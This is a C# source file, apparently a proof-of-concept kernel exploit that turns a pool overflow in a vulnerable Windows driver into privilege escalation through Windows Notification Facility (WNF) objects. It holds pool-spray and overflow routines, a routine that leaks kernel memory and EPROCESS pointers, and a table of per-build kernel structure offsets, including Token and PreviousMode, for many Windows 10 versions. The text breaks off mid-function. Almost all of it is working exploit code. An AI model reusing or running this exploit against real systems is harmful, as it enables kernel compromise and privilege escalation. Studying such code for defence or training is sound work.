using System;
using System.Text;
using System.Runtime.InteropServices;

namespace WnfPoolOverflow
{
    class WnfPoolOverflow
    {
        /*
         * P/Invoke : Enum
         */
        [Flags]
        enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFFF,
            ACCESS_SYSTEM_SECURITY = 0x01000000,
            MAXIMUM_ALLOWED = 0x02000000,
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,
            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,
            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,
            WINSTA_ALL_ACCESS = 0x0000037F
        }

        enum WELL_KNOWN_SID_TYPE
        {
            WinNullSid = 0,
            WinWorldSid = 1,
            WinLocalSid = 2,
            WinCreatorOwnerSid = 3,
            WinCreatorGroupSid = 4,
            WinCreatorOwnerServerSid = 5,
            WinCreatorGroupServerSid = 6,
            WinNtAuthoritySid = 7,
            WinDialupSid = 8,
            WinNetworkSid = 9,
            WinBatchSid = 10,
            WinInteractiveSid = 11,
            WinServiceSid = 12,
            WinAnonymousSid = 13,
            WinProxySid = 14,
            WinEnterpriseControllersSid = 15,
            WinSelfSid = 16,
            WinAuthenticatedUserSid = 17,
            WinRestrictedCodeSid = 18,
            WinTerminalServerSid = 19,
            WinRemoteLogonIdSid = 20,
            WinLogonIdsSid = 21,
            WinLocalSystemSid = 22,
            WinLocalServiceSid = 23,
            WinNetworkServiceSid = 24,
            WinBuiltinDomainSid = 25,
            WinBuiltinAdministratorsSid = 26,
            WinBuiltinUsersSid = 27,
            WinBuiltinGuestsSid = 28,
            WinBuiltinPowerUsersSid = 29,
            WinBuiltinAccountOperatorsSid = 30,
            WinBuiltinSystemOperatorsSid = 31,
            WinBuiltinPrintOperatorsSid = 32,
            WinBuiltinBackupOperatorsSid = 33,
            WinBuiltinReplicatorSid = 34,
            WinBuiltinPreWindows2000CompatibleAccessSid = 35,
            WinBuiltinRemoteDesktopUsersSid = 36,
            WinBuiltinNetworkConfigurationOperatorsSid = 37,
            WinAccountAdministratorSid = 38,
            WinAccountGuestSid = 39,
            WinAccountKrbtgtSid = 40,
            WinAccountDomainAdminsSid = 41,
            WinAccountDomainUsersSid = 42,
            WinAccountDomainGuestsSid = 43,
            WinAccountComputersSid = 44,
            WinAccountControllersSid = 45,
            WinAccountCertAdminsSid = 46,
            WinAccountSchemaAdminsSid = 47,
            WinAccountEnterpriseAdminsSid = 48,
            WinAccountPolicyAdminsSid = 49,
            WinAccountRasAndIasServersSid = 50,
            WinNTLMAuthenticationSid = 51,
            WinDigestAuthenticationSid = 52,
            WinSChannelAuthenticationSid = 53,
            WinThisOrganizationSid = 54,
            WinOtherOrganizationSid = 55,
            WinBuiltinIncomingForestTrustBuildersSid = 56,
            WinBuiltinPerfMonitoringUsersSid = 57,
            WinBuiltinPerfLoggingUsersSid = 58,
            WinBuiltinAuthorizationAccessSid = 59,
            WinBuiltinTerminalServerLicenseServersSid = 60
        }

        enum WNF_DATA_SCOPE
        {
            WnfDataScopeSystem = 0,
            WnfDataScopeSession = 1,
            WnfDataScopeUser = 2,
            WnfDataScopeProcess = 3,
            WnfDataScopeMachine = 4,
            WnfDataScopePhysicalMachine = 5
        }

        enum WNF_STATE_NAME_LIFETIME
        {
            WnfWellKnownStateName = 0,
            WnfPermanentStateName = 1,
            WnfPersistentStateName = 2,
            WnfTemporaryStateName = 3
        }

        /*
         * P/Invoke : Struct
         */
        [StructLayout(LayoutKind.Sequential)]
        struct ACCESS_ALLOWED_ACE
        {
            public ACE_HEADER Header;
            public int Mask;
            public int SidStart;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct ACE_HEADER
        {
            public byte AceType;
            public byte AceFlags;
            public short AceSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct ACL
        {
            public byte AclRevision;
            public byte Sbz1;
            public short AclSize;
            public short AceCount;
            public short Sbz2;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct EX_RUNDOWN_REF
        {
            public IntPtr Ptr;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct RTL_BALANCED_NODE
        {
            public IntPtr Left;
            public IntPtr Right;
            public ulong ParentValue;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_DESCRIPTOR
        {
            public byte Revision;
            public byte Sbz1;
            public ushort Control; // SECURITY_DESCRIPTOR_CONTROL Enum
            public IntPtr Owner; // PSID
            public IntPtr Group; // PSID
            public IntPtr Sacl; // PACL
            public IntPtr Dacl; // PACL
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WNF_NAME_INSTANCE
        {
            public WNF_NODE_HEADER Header;
            public EX_RUNDOWN_REF RunRef;
            public RTL_BALANCED_NODE TreeLinks;
            public ulong StateName;
            public IntPtr ScopeInstance;
            public WNF_STATE_NAME_REGISTRATION StateNameInfo;
            public IntPtr StateDataLock;
            public IntPtr StateData;
            public uint CurrentChangeStamp;
            public IntPtr PermanentDataStore;
            public IntPtr StateSubscriptionListLock;
            public LIST_ENTRY StateSubscriptionListHead;
            public LIST_ENTRY TemporaryNameListEntry;
            public IntPtr CreatorProcess; // Pointer to EPROCESS
            public int DataSubscribersCount;
            public int CurrentDeliveryCount;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WNF_NODE_HEADER
        {
            public ushort NodeTypeCode;
            public ushort NodeByteSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WNF_STATE_DATA
        {
            public WNF_NODE_HEADER Header;
            public uint AllocatedSize;
            public uint DataSize;
            public uint ChangeStamp;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WNF_STATE_NAME_REGISTRATION
        {
            public uint MaxStateSize;
            public IntPtr TypeId;
            public IntPtr SecurityDescriptor;
        }

        /*
         * P/Invoke : API
         */
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AddAccessAllowedAce(
            IntPtr pAcl,
            int dwAceRevision,
            ACCESS_MASK AccessMask,
            IntPtr pSid);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool CreateWellKnownSid(
            WELL_KNOWN_SID_TYPE WellKnownSidType,
            IntPtr DomainSid,
            IntPtr pSid,
            ref int cbSid);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            IntPtr pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool InitializeAcl(
            IntPtr pAcl,
            int nAclLength,
            int dwAclRevision);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool InitializeSecurityDescriptor(
            IntPtr pSecurityDescriptor,
            int dwRevision);

        [DllImport("ntdll.dll")]
        static extern int NtCreateWnfStateName(
            out ulong StateName,
            WNF_STATE_NAME_LIFETIME NameLifetime,
            WNF_DATA_SCOPE DataScope,
            bool PersistData,
            IntPtr TypeId,
            uint MaximumStateSize,
            IntPtr SecurityDescriptor);

        [DllImport("ntdll.dll")]
        static extern int NtDeleteWnfStateData(
            in ulong StateName,
            IntPtr ExplicitScope);

        [DllImport("ntdll.dll")]
        static extern int NtDeleteWnfStateName(in ulong StateName);

        [DllImport("ntdll.dll")]
        static extern int NtQueryWnfStateData(
            in ulong StateName,
            IntPtr TypeId,
            IntPtr ExplicitScope,
            out uint nChangeStamp,
            IntPtr buffer,
            ref uint nBufferSize);

        [DllImport("ntdll.dll")]
        static extern int NtReadVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint NumberOfBytesToRead,
            IntPtr NumberOfBytesReaded);

        [DllImport("ntdll.dll")]
        static extern int NtUpdateWnfStateData(
            in ulong StateName,
            IntPtr Buffer,
            uint Length,
            IntPtr TypeId,
            IntPtr ExplicitScope,
            uint MatchingChangeScope,
            uint CheckStamp);

        [DllImport("ntdll.dll")]
        static extern int NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint NumberOfBytesToWrite,
            IntPtr NumberOfBytesWritten);

        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetSecurityDescriptorDacl(
            IntPtr pSecurityDescriptor,
            bool bDaclPresent,
            IntPtr pDacl,
            bool bDaclDefaulted);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);

        /*
         * Windows Const.
         */
        const int ACL_REVISION = 2;
        static readonly int STATUS_BUFFER_TOO_SMALL = Convert.ToInt32("0xC0000023", 16);
        const uint GENERIC_READ = 0x80000000;
        const uint GENERIC_WRITE = 0x40000000;
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        const uint OPEN_EXISTING = 3;
        const int SECURITY_DESCRIPTOR_REVISION = 1;
        const int SECURITY_MAX_SID_SIZE = 68;
        const int STATUS_SUCCESS = 0;
        // const ushort WNF_SCOPE_MAP_CODE = 0x901;
        // const ushort WNF_SCOPE_INSTANCE_CODE = 0x902;
        const ushort WNF_NAME_INSTANCE_CODE = 0x903;
        // const ushort WNF_STATE_DATA_CODE = 0x904;
        // const ushort WNF_SUBSCRIPTION_CODE = 0x905;
        // const ushort WNF_PROCESS_CONTEXT_CODE = 0x906;
        static int g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
        static int g_OffsetThreadListHead = 0; // nt!_KPROCESS.ThreadListHead
        static int g_OffsetThreadListEntry = 0; // nt!_KTHREAD.ThreadListEntry
        static int g_OffsetPreviousMode = 0; // nt!_KTHREAD.PreviousMode
        static int g_OffsetUniqueProcessId = 0; // nt!_EPROCESS.UniqueProcessId
        static int g_ActiveProcessLinks = 0; // nt!_EPROCESS.ActiveProcessLinks
        static int g_OffsetToken = 0; // nt!_EPROCESS.Token

        /*
         * Global Variable
         */
        const uint g_ModifiedStateDataSize = 0x200;
        static readonly ulong[] g_StateNames = new ulong[10000];
        const uint IOCTL_ALLOC_OVERFLOW_BUFFER = 0xDEAD2003;
        const uint IOCTL_FREE_OVERFLOW_BUFFER = 0xDEAD2007;
        const uint IOCTL_TRIGGER_OVERFLOW = 0xDEAD200B;
        const ulong WNF_STATE_KEY = 0x41C64E6DA3BC0074;

        /*
         * User defined function
         */
        static ulong AllocateWnfNameInstance(IntPtr pSecurityDescriptor)
        {

            int ntstatus = NtCreateWnfStateName(
                out ulong stateName,
                WNF_STATE_NAME_LIFETIME.WnfTemporaryStateName,
                WNF_DATA_SCOPE.WnfDataScopeMachine,
                false,
                IntPtr.Zero,
                0x1000,
                pSecurityDescriptor);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("\n[-] Failed to NtCreateWnfStateName (ntstatus = 0x{0}).\n", ntstatus.ToString("X8"));

                return 0UL;
            }

            return stateName;
        }


        static bool AllocateWnfStateData(ulong stateName, byte[] data)
        {
            IntPtr buffer = Marshal.AllocHGlobal(data.Length);
            Marshal.Copy(data, 0, buffer, data.Length);

            int ntstatus = NtUpdateWnfStateData(
                in stateName,
                buffer,
                (uint)data.Length,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0);
            Marshal.FreeHGlobal(buffer);

            return ntstatus == STATUS_SUCCESS;
        }


        static bool CheckTargetVersion()
        {
            int MajorVersion = 0;
            int MinorVersion = 0;
            int BuildNumber = 0;

            Console.WriteLine("[>] Checking target environment.");

            if (!Environment.Is64BitOperatingSystem)
            {
                Console.WriteLine("[-] 32bit OS is not supported.");

                return false;
            }

            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("[-] This PoC should be build as 64bit binary.");

                return false;
            }

            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
            BuildNumber &= 0xFFFF;

            if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 10240)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 1507 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x2E8; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x2F0; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x358; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 10586)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 1511 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x2E8; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x2F0; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x358; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 14393)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 1607 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x2E8; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x2F0; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x358; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 15063)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 1703 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x2E0; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x2E8; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x358; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 16299)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 1709 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x2E0; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x2E8; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x358; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 17134)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 1803 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x2E0; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x2E8; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x358; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 17763)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 1809 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x2E0; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x2E8; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x358; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 18362)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 1903 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x2E8; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x2F0; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x360; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 18363)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 1909 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x2E8; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x2F0; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x360; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 19041)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 2004 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x440; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x448; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x4B8; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 19042)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 2009 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x440; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x448; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x4B8; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 19043)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 2104 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x440; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x448; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x4B8; // nt!_EPROCESS.Token

                return true;
            }
            else if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber == 19044)
            {
                Console.WriteLine("[+] DETECTED: Windows 10 Version 2110 x64");
                g_OffsetPcb = 0; // nt!_EPROCESS.Pcb
                g_OffsetThreadListHead = 0x30; // nt!_KPROCESS.ThreadListHead
                g_OffsetPreviousMode = 0x232; // nt!_KTHREAD.PreviousMode
                g_OffsetThreadListEntry = 0x2F8; // nt!_KTHREAD.ThreadListEntry
                g_OffsetUniqueProcessId = 0x440; // nt!_EPROCESS.UniqueProcessId
                g_ActiveProcessLinks = 0x448; // nt!_EPROCESS.ActiveProcessLinks
                g_OffsetToken = 0x4B8; // nt!_EPROCESS.Token

                return true;
            }
            else
            {
                Console.WriteLine("[-] Unsupported version is detected.");
                return false;
            }
        }



        static bool FreeWnfNameInstance(ulong stateName)
        {
            return NtDeleteWnfStateName(in stateName) == STATUS_SUCCESS;
        }


        static bool FreeWnfStateData(ulong stateName)
        {
            return NtDeleteWnfStateData(in stateName, IntPtr.Zero) == STATUS_SUCCESS;
        }


        static IntPtr GetDeviceHandle(string devicePath)
        {
            return CreateFile(
                devicePath,
                GENERIC_READ | GENERIC_WRITE,
                0,
                IntPtr.Zero,
                OPEN_EXISTING,
                0,
                IntPtr.Zero);
        }


        static IntPtr GetWorldGenericAllSecurityDescriptor()
        {
            int cbSid = SECURITY_MAX_SID_SIZE;
            IntPtr pSid = Marshal.AllocHGlobal(cbSid);

            if (!CreateWellKnownSid(
                WELL_KNOWN_SID_TYPE.WinWorldSid,
                IntPtr.Zero,
                pSid,
                ref cbSid))
            {
                Marshal.FreeHGlobal(pSid);

                return IntPtr.Zero;
            }

            int cbDacl = Marshal.SizeOf(typeof(ACL)) +
                Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) -
                Marshal.SizeOf(typeof(int)) +
                cbSid;
            IntPtr pDacl = Marshal.AllocHGlobal(cbDacl);

            if (!InitializeAcl(pDacl, cbDacl, ACL_REVISION))
            {
                Marshal.FreeHGlobal(pSid);
                Marshal.FreeHGlobal(pDacl);

                return IntPtr.Zero;
            }

            if (!AddAccessAllowedAce(
                pDacl,
                ACL_REVISION,
                ACCESS_MASK.GENERIC_ALL,
                pSid))
            {
                Marshal.FreeHGlobal(pSid);
                Marshal.FreeHGlobal(pDacl);

                return IntPtr.Zero;
            }

            IntPtr pSecurityDescriptor = Marshal.AllocHGlobal(Marshal.SizeOf(
                typeof(SECURITY_DESCRIPTOR)));

            if (!InitializeSecurityDescriptor(
                pSecurityDescriptor,
                SECURITY_DESCRIPTOR_REVISION))
            {
                Marshal.FreeHGlobal(pSid);
                Marshal.FreeHGlobal(pDacl);

                return IntPtr.Zero;
            }

            if (!SetSecurityDescriptorDacl(
                pSecurityDescriptor,
                true,
                pDacl,
                false))
            {
                Marshal.FreeHGlobal(pSid);
                Marshal.FreeHGlobal(pDacl);

                return IntPtr.Zero;
            }

            return pSecurityDescriptor;
        }


        static bool IoctlAllocateObject(IntPtr hDevice)
        {
            bool status;
            var inputData = Encoding.ASCII.GetBytes(new string('B', 0xB0));
            IntPtr buffer = Marshal.AllocHGlobal(inputData.Length);
            Marshal.Copy(inputData, 0, buffer, inputData.Length);

            status = DeviceIoControl(
                hDevice,
                IOCTL_ALLOC_OVERFLOW_BUFFER,
                buffer,
                inputData.Length,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                IntPtr.Zero);

            Marshal.FreeHGlobal(buffer);

            return status;
        }


        static bool IoctlFreeObject(IntPtr hDevice)
        {
            return DeviceIoControl(
                hDevice,
                IOCTL_FREE_OVERFLOW_BUFFER,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                IntPtr.Zero);
        }


        static bool IoctlOverflowObject(IntPtr hDevice, IntPtr buffer, int size)
        {
            return DeviceIoControl(
                hDevice,
                IOCTL_TRIGGER_OVERFLOW,
                buffer,
                size,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                IntPtr.Zero);
        }


        static bool IsKernelAddress(IntPtr address)
        {
            return (((ulong)address.ToInt64() & 0xFFFF800000000000) == 0xFFFF800000000000);
        }


        static bool LeakKernelData(
            IntPtr hDevice,
            out IntPtr pEprocess,
            out ulong corruptedStateName,
            out WNF_NAME_INSTANCE targetNameInstance)
        {
            int ntstatus;
            WNF_NAME_INSTANCE nameInstance;
            IntPtr pNameInstance;
            int nSizeOverflow = 0xB0 + 0x10 + Marshal.SizeOf(typeof(WNF_STATE_DATA)); // (Buffer Length) + (Size of _POOL_HEADER) + (Size of _WNF_STATE_DATA)
            IntPtr pOverflowInput = Marshal.AllocHGlobal(nSizeOverflow);
            uint nSizeLeakData;
            IntPtr pLeakData = Marshal.AllocHGlobal((int)g_ModifiedStateDataSize);
            bool success = false;
            var stateData = new WNF_STATE_DATA
            {
                Header = new WNF_NODE_HEADER { NodeTypeCode = 0x0903, NodeByteSize = 0xA8 },
                AllocatedSize = g_ModifiedStateDataSize,
                DataSize = g_ModifiedStateDataSize,
                ChangeStamp = 1
            };

            Marshal.StructureToPtr(stateData, new IntPtr(pOverflowInput.ToInt64() + 0xC0), true);
            pEprocess = IntPtr.Zero;
            corruptedStateName = 0UL;
            targetNameInstance = new WNF_NAME_INSTANCE();

            for (var count = 0; count < 1000; count++)
            {
                IoctlAllocateObject(hDevice);
                IoctlOverflowObject(hDevice, pOverflowInput, nSizeOverflow);

                for (var idx = 0; idx < g_StateNames.Length; idx++)
                {
                    if (g_StateNames[idx] == 0UL)
                        continue;

                    nSizeLeakData = 0xA0u;
                    ntstatus = NtQueryWnfStateData(
                        in g_StateNames[idx],
                        IntPtr.Zero,
                        IntPtr.Zero,
                        out uint nChangeStamp,
                        pLeakData,
                        ref nSizeLeakData);

                    if (ntstatus == STATUS_BUFFER_TOO_SMALL)
                    {
                        nSizeLeakData = g_ModifiedStateDataSize;
                        NtQueryWnfStateData(
                            in g_StateNames[idx],
                            IntPtr.Zero,
                            IntPtr.Zero,
                            out nChangeStamp,
                            pLeakData,
                            ref nSizeLeakData);

                        pNameInstance = new IntPtr(pLeakData.ToInt64() + 0xA0 + 0x10);
                        nameInstance = (WNF_NAME_INSTANCE)Marshal.PtrToStructure(
                            pNameInstance,
                            typeof(WNF_NAME_INSTANCE));

                        if (nameInstance.Header.NodeTypeCode == WNF_NAME_INSTANCE_CODE)
                        {
                            pEprocess = nameInstance.CreatorProcess;
                            corruptedStateName = g_StateNames[idx];
